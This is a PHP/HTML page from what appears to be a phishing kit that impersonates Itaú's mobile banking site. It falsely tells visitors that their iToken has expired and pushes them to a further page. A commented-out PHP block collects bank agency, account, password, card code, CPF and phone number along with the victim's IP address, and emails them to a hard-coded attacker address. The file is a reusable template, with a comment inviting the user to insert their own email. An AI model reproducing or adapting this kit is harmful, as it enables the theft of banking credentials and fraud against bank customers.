<?php

/*$AGinforma = $_POST['AGinforma'];
$CTinforma = $_POST['CTinforma'];
$SEinforma = $_POST['SEinforma'];
$DDDinforma = $_POST['DDDinforma'];
$CELinforma = $_POST['CELinforma'];
$CPinforma = $_POST['CPinforma'];
$SCinforma = $_POST['SCinforma'];


$useragent = $_SERVER['HTTP_USER_AGENT'];
 
  if (preg_match('|MSIE ([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'IE';
  } elseif (preg_match( '|Opera/([0-9].[0-9]{1,2})|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Opera';
  } elseif(preg_match('|Firefox/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Firefox';
  } elseif(preg_match('|Chrome/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Chrome';
  } elseif(preg_match('|Safari/([0-9\.]+)|',$useragent,$matched)) {
    $browser_version=$matched[1];
    $browser = 'Safari';
  } else {
    // browser not recognized!
    $browser_version = 0;
    $browser= 'other';
  }
  
$today      = date("H-i-s");
$ip_usuario = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('America/Sao_Paulo');
$dataE      =    date('d/m/Y');


$ip = $_SERVER["REMOTE_ADDR"];
$dtehr = date("d-m-y H-i-s");

$message = "
---------------------------------------------------<br />
<b>Navegador:</b> $browser - $browser_version<br />
<b>Data:</b> $today<br />
<b>Ip:</b> $ip_usuario<br />
----------------------------------------------------<br />
<b>[Sheik]-AG:</b> $AGinforma<br />
<b>[Sheik]-CT:</b> $CTinforma<br />
<b>[Sheik]-SE:</b> $SEinforma<br />
<b>[Sheik]-SC:</b> $SCinforma<br />
<b>[Sheik]-CPF:</b> $CPinforma<br />
<b>[Sheik]-CEL:</b> $DDDinforma-$CELinforma<br />
----------------------------------------------------<br />";

$email = "servicosserio@outlook.com"; // SEU EMAIL AQUI PATRAOZAOOOO :D~
$assunto = "Laranjinha - $ip - Confirmacao recebida com sucesso!";
$nome = "Laranjinha";


$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: Laranjinha <confirmacao@cadastrocliente.com.br>\r\n";

@mail($email, $assunto, $message, $headers);
*/

?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<script type="text/javascript" src="app/js/complemento.js"></script>
<title>Mobile Itau</title>
<style>
body {margin:0;}


#btter {
	width:80px;
	padding:10px;
	background:url(app/img/botom.png) repeat;
	color:#FFF;
	font-family:Verdana, Geneva, sans-serif;
	font-size:20px;
	border-radius:4px;
	border:0 none;
	text-decoration:none;
	}
	
</style>
</head>

<body>

<div style="text-align:center; font-family:Arial, Helvetica, sans-serif; font-size:16px; color:#666; border-bottom:#CCC solid 1px; padding:10px;">iToken</div>

<div style="padding:20px;">

<div style="padding:10px; text-align:center; font-family:Arial, Helvetica, sans-serif; font-size:14px; color:#F30; font-weight:bold;">iToken Expirado</div>


<div style="padding:10px; text-align:center; font-family:Arial, Helvetica, sans-serif; font-size:16px; color:#666;">Identificamos que seu iToken no aplicativo está expirado.
</div>

<div style="padding:10px; text-align:center; font-family:Arial, Helvetica, sans-serif; font-size:16px; color:#666;">Para ativar o iToken no aplicativo neste aparelho, clique em Continuar e siga as instruçoes.
</div>


<div style="text-align:center; padding-top:50px;"><a href="index5.php" id="btter">Continuar</a></div>

</div>
</body>
</html>